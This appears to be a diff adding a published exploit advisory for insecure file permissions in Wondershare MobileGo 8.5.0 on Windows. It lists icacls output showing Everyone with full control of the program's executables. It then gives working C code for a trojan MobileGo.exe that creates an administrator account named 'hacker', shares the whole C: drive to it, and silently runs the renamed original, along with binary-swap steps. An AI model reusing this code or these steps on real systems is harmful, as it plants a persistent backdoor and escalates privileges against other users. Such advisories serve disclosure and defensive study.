@@ -1,0 +1,102 @@
+# Exploit Title: MobileGo 8.5.0 - Insecure File Permissions
+# Exploit Author: ZwX
+# Exploit Date: 2019-11-15
+# Vendor Homepage : https://www.wondershare.net/
+# Software Link: https://www.wondershare.net/mobilego/
+# Tested on OS: Windows 7 
+
+
+# Proof of Concept (PoC):
+==========================
+C:\Program Files\Wondershare\MobileGo>icacls *.exe
+adb.exe Everyone:(I)(F)
+        AUTORITE NT\Système:(I)(F)
+        BUILTIN\Administrateurs:(I)(F)
+        BUILTIN\Utilisateurs:(I)(RX)
+
+APKInstaller.exe Everyone:(I)(F)
+        AUTORITE NT\Système:(I)(F)
+        BUILTIN\Administrateurs:(I)(F)
+        BUILTIN\Utilisateurs:(I)(RX)
+
+BsSndRpt.exe Everyone:(I)(F)
+             AUTORITE NT\Système:(I)(F)
+             BUILTIN\Administrateurs:(I)(F)
+             BUILTIN\Utilisateurs:(I)(RX)
+
+DriverInstall.exe Everyone:(I)(F)
+                  AUTORITE NT\Système:(I)(F)
+                  BUILTIN\Administrateurs:(I)(F)
+                  BUILTIN\Utilisateurs:(I)(RX)
+
+fastboot.exe Everyone:(I)(F)
+             AUTORITE NT\Système:(I)(F)
+             BUILTIN\Administrateurs:(I)(F)
+             BUILTIN\Utilisateurs:(I)(RX)
+
+FetchDriver.exe Everyone:(I)(F)
+                AUTORITE NT\Système:(I)(F)
+                BUILTIN\Administrateurs:(I)(F)
+                BUILTIN\Utilisateurs:(I)(RX)
+
+MGNotification.exe Everyone:(I)(F)
+                   AUTORITE NT\Système:(I)(F)
+                   BUILTIN\Administrateurs:(I)(F)
+                   BUILTIN\Utilisateurs:(I)(RX)
+
+MobileGo.exe Everyone:(I)(F)
+             AUTORITE NT\Système:(I)(F)
+             BUILTIN\Administrateurs:(I)(F)
+             BUILTIN\Utilisateurs:(I)(RX)
+
+MobileGoService.exe Everyone:(I)(F)
+                    AUTORITE NT\Système:(I)(F)
+                    BUILTIN\Administrateurs:(I)(F)
+                    BUILTIN\Utilisateurs:(I)(RX)
+
+unins000.exe Everyone:(I)(F)
+             AUTORITE NT\Système:(I)(F)
+             BUILTIN\Administrateurs:(I)(F)
+             BUILTIN\Utilisateurs:(I)(RX)
+
+URLReqService.exe Everyone:(I)(F)
+                  AUTORITE NT\Système:(I)(F)
+                  BUILTIN\Administrateurs:(I)(F)
+                  BUILTIN\Utilisateurs:(I)(RX)
+
+WAFSetup.exe Everyone:(I)(F)
+             AUTORITE NT\Système:(I)(F)
+             BUILTIN\Administrateurs:(I)(F)
+             BUILTIN\Utilisateurs:(I)(RX)
+
+WsConverter.exe Everyone:(I)(F)
+                AUTORITE NT\Système:(I)(F)
+                BUILTIN\Administrateurs:(I)(F)
+                BUILTIN\Utilisateurs:(I)(RX)
+
+WsMediaInfo.exe Everyone:(I)(F)
+                AUTORITE NT\Système:(I)(F)
+                BUILTIN\Administrateurs:(I)(F)
+                BUILTIN\Utilisateurs:(I)(RX)
+				
+				
+				
+#Exploit code(s): 
+=================
+
+1) Compile below 'C' code name it as "MobileGo.exe"
+
+#include<windows.h>
+
+int main(void){
+ system("net user hacker abc123 /add");
+ system("net localgroup Administrators hacker  /add");
+ system("net share SHARE_NAME=c:\ /grant:hacker,full");
+ WinExec("C:\\Program Files\\Wondershare\\MobileGo\\~MobileGo.exe",0);
+return 0;
+} 
+
+2) Rename original "MobileGo.exe" to "~MobileGo.exe"
+3) Place our malicious "MobileGo.exe" in the MobileGo directory
+4) Disconnect and wait for a more privileged user to connect and use MobileGo IDE. 
+Privilege Successful Escalation
